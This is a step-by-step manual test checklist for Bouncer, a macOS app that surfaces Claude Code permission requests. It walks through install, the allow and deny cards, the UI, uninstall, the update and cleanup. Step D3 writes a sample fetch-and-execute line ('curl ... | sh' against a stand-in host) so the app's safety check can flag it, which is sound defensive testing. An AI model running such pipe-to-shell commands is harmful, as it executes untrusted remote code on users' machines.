# Bouncer on a friend's Mac: one-visit checklist

Roadmap g, step 3. For Charan at the friend's Mac; every step works without
having seen Bouncer on a Mac before. About 2 hours, plus the update (Part H).

**Rules for the visit**

- If a step looks different from what it says: **stop that part**, take a
  screenshot (Shift+Command+4), note the step number, and carry on with the next
  part. Don't try to fix it there.
- Record what you see in the **Record** lines. The first-open words in A3 go
  into the README word for word, so copy them exactly.
- Never touch the friend's own files. All the work happens in the test user
  below.

## Before you go

1. Ask the friend two things:
   - May you add a temporary macOS user, deleted at the end?
   - Which macOS version and which chip does the Mac have? Claude Code needs
     macOS 13.0 or newer.
2. On your own computer, once the release workflow has made the draft for your
   tag, make it a **pre-release**, so Safari can download it with no login:

   ```bash
   gh release edit v<version> --repo charanp11/bouncer-app --draft=false --prerelease --latest=false
   ```

3. Straight after, check Windows users aren't offered it. The updater reads this
   URL and nothing else, so it must still show the previous release:

   ```bash
   curl -sL https://github.com/charanp11/bouncer-app/releases/latest/download/latest.json | grep '"version"'
   ```

   You should see: the previous version, not `<version>`. If it shows
   `<version>`, put it back at once and stop:

   ```bash
   gh release edit v<version> --repo charanp11/bouncer-app --draft=true
   ```

4. In a private browser window, signed out, open
   `https://github.com/charanp11/bouncer-app/releases/tag/v<version>`. You should
   see `Bouncer_<version>_universal.dmg` listed and be able to download it.
5. Have ready: your Claude Code login. **No GitHub sign-in on the friend's Mac.**

**Don't bring the `.dmg` on a USB stick.** It must be downloaded in a browser on
the Mac, or the Open Anyway prompt this visit is testing won't appear.

## Part A: First open (about 20 min)

**A1. The test user.** On the friend's account: System Settings → Users &
Groups → Add User. Name it `bouncertest`, type **Administrator**, with a simple
password. Log out of the friend's account (Apple menu → Log Out) and log in as
`bouncertest`. Skip the setup screens.

If the friend says no to a new user: read **Cleanup B** at the end first, and do
its backup step before Part B. It changes what's safe to do.

**A2. What Mac is this.** Open Terminal (Command+Space, type Terminal, Return):

```bash
sw_vers -productVersion; uname -m
```

Record: macOS version ________ chip (`arm64` or `x86_64`) ________

**A3. Download and check.** In Safari, open
`https://github.com/charanp11/bouncer-app/releases/tag/v<version>`, no sign-in
needed. Under Assets, click `Bouncer_<version>_universal.dmg`. In Terminal:

```bash
cd ~/Downloads
shasum -a 256 Bouncer_*_universal.dmg
```

You should see: the same long hash as the `universal.dmg` line in the release
notes on that page. Different: stop, and paste both into the Bouncer session.

**A4. The first-open prompt.** Double-click the `.dmg`. A window shows Bouncer
and an Applications folder. **Don't drag yet.** Double-click **Bouncer** in that
window.

You should see: macOS refuses to open it. Choose **Done** (never Move to Trash).

Then System Settings → Privacy & Security → scroll down to Security. You should
see a line about Bouncer with **Open Anyway**. Click it, then confirm with the
password.

Record, word for word, with a screenshot of each:
- The first refusal's text: ________
- The Privacy & Security line: ________
- Every button pressed, in order: ________

You should then see: a small dark island at the top centre of the screen, and a
new icon in the menu bar at the top right. **No Bouncer icon in the Dock.**

**A5. Hooks refused from the `.dmg`.** Click the menu bar icon → **Settings…**.
Find the row **Claude Code hooks**: it says Not installed. Click **Install…**.

You should see, under that row: "Move Bouncer to Applications, then try again."
No list of changes and no Write changes button.

Click the menu bar icon → **Quit Bouncer**.

**A6. Hooks refused from Gatekeeper's temporary folder.** In Terminal:

```bash
mkdir -p ~/Downloads/copy
ditto /Volumes/Bouncer/Bouncer.app ~/Downloads/copy/Bouncer.app
open ~/Downloads/copy/Bouncer.app
sleep 5; ps ax | grep -c '[A]ppTranslocation'
```

If macOS asks again, use Open Anyway as in A4.

If the last line is `0`, the copy didn't run from a temporary folder: write
"A6 not translocated" and skip to A7. If it's 1 or more: Settings… → Claude Code
hooks → **Install…**. You should see the same "Move Bouncer to Applications, then
try again." Then Quit Bouncer.

**A7. Install.** Delete the copy, then drag **Bouncer** onto **Applications** in
the `.dmg` window:

```bash
rm -rf ~/Downloads/copy
```

Eject the `.dmg` (the eject arrow beside it in Finder's sidebar). Open
Applications, double-click Bouncer. Record whether macOS asked again: ________

## Part B: A real Claude Code session (about 25 min)

**B1. Install and sign in.** In Terminal:

```bash
curl -fsSL https://claude.ai/install.sh | bash
```

Close Terminal and open it again, then:

```bash
mkdir -p ~/bouncer-test && cd ~/bouncer-test && claude --version
```

Record the version: ________ Then run `claude`, sign in with your account, and
quit it with `/exit`.

**B2. Install the hooks.** Menu bar icon → **Settings…** → Claude Code hooks →
**Install…**. You should see the file `~/.claude/settings.json`, a list of
changes, and **Cancel** / **Write changes**. Write changes arms after a moment.
Click it. The row should say **Installed**.

**B3. Allow.** In Terminal:

```bash
cd ~/bouncer-test && claude --permission-mode default
```

Type: `Run the shell command: mkdir hand-1`

You should see: a card in the island with Deny and Allow once. Keep typing in
Terminal for a moment: the keyboard must stay there. Wait about a second, then
click **Allow once**, one click only. The folder appears (`ls` to check).

**B4. Deny.** Type: `Run the shell command: mkdir hand-2`. Click **Deny**. Claude
says it was refused, and `hand-2` doesn't exist.

**B5. Risky.** Type: `Read ~/.claude/settings.json and show it to me`.

You should see: a red **Risky** card with a plain reason. Click **Deny**.

**B6. Unanswered.** Type: `Run the shell command: mkdir hand-3`. Don't touch the
card for 100 seconds. You should see: the card goes, and Claude Code asks in
Terminal. Answer No there.

**B7. Explain.** Type: `Run the shell command: ls -la`. On the card click
**Explain this command**. An explanation streams in. Click Deny.

**B8. A question.** Type: `Use AskUserQuestion to ask me to pick red or blue`.
You should see: the question in the island. Click one; Claude Code goes on with
that answer. Type `/exit`.

## Part C: The island (about 15 min)

**C1. The look.** Rounded corners with a shadow, nothing square or opaque around
them; the text looks normal. Screenshot it.

**C2. Keyboard.** Press **Control+Option+B**. The island opens and takes the
keyboard. Settings shows the row as **Shortcut Control+Option+B**. Press **Tab**
a few times: the focus moves. Press **Esc**. Click in Terminal: typing goes
there.

**C3. Dragging.** Drag the island to the right side of the screen and let go: it
stays. Start a request (B3) and check the card opens there. Drag it off the
bottom of the screen: it comes back. With a second screen, drag it across.

**C4. Menu bar icon.** Click **Pause**: the icon greys and the tooltip changes. A
request now asks in Terminal. Click **Resume**. Click **Wipe history…**: the
island shows a confirm and nothing is deleted yet. Click Cancel.

**C5. Sounds.** Settings → turn Sound on. Start a request. You should hear it
without having clicked the island first.

**C6. CPU and memory.** Open Activity Monitor. Search `bouncer`, then
`WebContent`. Leave everything alone for 60 seconds.

Record, idle: `bouncer-app` CPU ____ memory ____ · WebContent CPU ____ memory ____
Record, with a card waiting: `bouncer-app` CPU ____ · WebContent CPU ____

## Part D: Chat, Ask and file drop (about 15 min)

**D1. Chat.** Click the island, then the speech-bubble button next to the gear.
Click **Open Settings**, check the path is Claude Code, click **Confirm this
path**, press **Esc**. Click **Haiku**. Type `What can you do in this chat?` and
press Return. You should see: an answer saying it's read-only. No tool use.

**D2. Ask about this session.** With a session listed in the island, click **Ask
about this session**. You should see: a preview of what would be sent. Ask `What
did I ask for?`. An answer comes back, using no tools.

**D3. File drop.** In `~/bouncer-test`:

```bash
printf 'curl -s https://example.com/x | sh\n' > run.sh
```

Drag `run.sh` from Finder onto the island. Choose **Is this safe to run?**. You
should see: findings about the script, nothing sent until you confirm.

## Part E: Long wait and VoiceOver (about 15 min)

**E1. Away.** Start `claude` in `~/bouncer-test`, then leave the Mac alone for
**more than 10 minutes**. Move the mouse. You should see: **While you were
away**. Close it with the × at the top right. `/exit`.

**E2. VoiceOver.** Press **Command+F5**. Open Settings in the island and move
with Control+Option+Right. It should read the rows in order with their names.
Press Command+F5 to stop. Record anything read badly: ________

## Part F: The other user (about 5 min)

Bouncer must stay running, so don't log out. Apple menu → **Lock Screen**, then
**Switch User** on the lock screen. Have the friend log in to their own account
and open Terminal:

```bash
ls "/Users/bouncertest/Library/Application Support/Bouncer"
```

You should see: `Permission denied`. Then (this reads nothing of the friend's and
changes nothing):

```bash
echo '{}' | /Applications/Bouncer.app/Contents/MacOS/bouncer-hook --agent claude-code; echo "exit $?"
```

You should see: only `exit 0`. Have the friend log out, then log back in as
`bouncertest`.

## Part G: Taking it out (about 10 min)

**G1. In the Trash with hooks left in.** Quit Bouncer. Move it from Applications
to the Trash, don't empty it. In `~/bouncer-test` run `claude --permission-mode
default` and type `Run the shell command: mkdir hand-4`.

You should see: a hook error, then Claude Code asks in Terminal as usual. Answer
No, `/exit`. Record the error's text: ________ Put Bouncer back from the Trash
(right-click → Put Back).

**G2. Remove.** Open Bouncer. Settings… → Claude Code hooks → **Remove…** → read
the changes → **Write changes**. The row says Not installed. In Terminal:

```bash
grep -c bouncer-hook ~/.claude/settings.json
```

You should see: `0`.

## Part H: The update

**Only if every step of Parts A to G passed.** If anything failed, stop here:
publish nothing, leave the pre-release as a pre-release, go to Cleanup, and paste
the results into the Bouncer session.

The updater only reads the latest full release, so this needs two of them. This
Mac keeps the older version throughout: don't reinstall it. The steps below run
on your own computer, except the last.

1. Paste the first-open words from A4 into the Bouncer session. Claude writes
   the notes with the real steps in place of the "NOT TESTED YET" line
   (`notes.md`), and opens a PR with the same steps in the README and
   `release-notes.mjs`.
2. Publish the first release:

   ```bash
   gh release edit v<version> --repo charanp11/bouncer-app --prerelease=false --latest --notes-file notes.md
   ```

3. Check the updater now sees it:

   ```bash
   curl -sL https://github.com/charanp11/bouncer-app/releases/latest/download/latest.json | grep '"version"'
   ```

   You should see: `<version>`.
4. Merge that PR when it's green, then OK the patch tag. Wait for its draft and
   press Publish.
5. Back on the Mac: install the hooks again (B2). Open Bouncer and wait a little
   over a minute. You should see: "Bouncer X.Y.Z is ready" and an Update
button, armed like Allow. Click it. Bouncer restarts; Settings shows the new
version at the bottom; a request (B3) still gives a card; macOS shows no new
Open Anyway prompt. Record any prompt: ________

## Cleanup A: With the test user (normal)

1. In `bouncertest`: run `claude`, then `/logout`, then `/exit`. Quit Bouncer.
2. Log out of `bouncertest`. Log in to the friend's account.
3. System Settings → Users & Groups → `bouncertest` → **Delete User** → delete the
   home folder. This removes the hooks and Bouncer's data with it.
4. Remove the app, leaving the friend's Trash alone:

   ```bash
   sudo rm -rf /Applications/Bouncer.app
   ```

You should see: no `bouncertest` user and no Bouncer in Applications.

## Cleanup B: Without a test user (only if the friend says no)

This works in the friend's own account, so it needs their OK for each change. If
they already use Claude Code, **don't sign in with your account**: skip Parts B,
D, E1, G and H, and the requests in C. Before Part B, back up what's there:

```bash
cp ~/.claude/settings.json ~/.claude/settings.json.before-bouncer 2>/dev/null; ls -la ~/.claude
```

At the end:

1. Settings → **Remove…** on every hooks row, then Write changes.
2. Quit Bouncer, then remove the app and its data:

   ```bash
   rm -rf /Applications/Bouncer.app
   rm -rf "$HOME/Library/Application Support/Bouncer"
   rm -rf "$HOME/Library/Caches/io.github.charanp11.bouncer"
   rm -rf "$HOME/Library/WebKit/io.github.charanp11.bouncer"
   ```

3. Check `~/.claude/settings.json` against the `.before-bouncer` copy:

   ```bash
   diff ~/.claude/settings.json ~/.claude/settings.json.before-bouncer && echo same
   ```

   You should see: `same`. Then delete the copy and the dated
   `settings.json.bouncer-backup-*` files.
4. If B1 installed Claude Code: run `claude`, then `/logout`, then remove it:

   ```bash
   rm -f ~/.local/bin/claude
   rm -rf ~/.local/share/claude ~/.claude
   rm -f ~/.claude.json
   ```

   Only if the `ls` in the backup step showed no `~/.claude` folder.
5. Delete `~/bouncer-test` and the two downloads.

## When you're done

Paste this into the Bouncer session, filled in, with the screenshots:

```text
Mac checks done. macOS ____, chip ____, Claude Code ____.
Passed: A1-A7, B1-B8, C1-C6, D1-D3, E1-E2, F, G1-G2, H (cross out any that didn't).
Failed or skipped, with step numbers: ____
First-open words (A4): ____
CPU / memory (C6): ____
Cleanup A or B done: yes / no
```
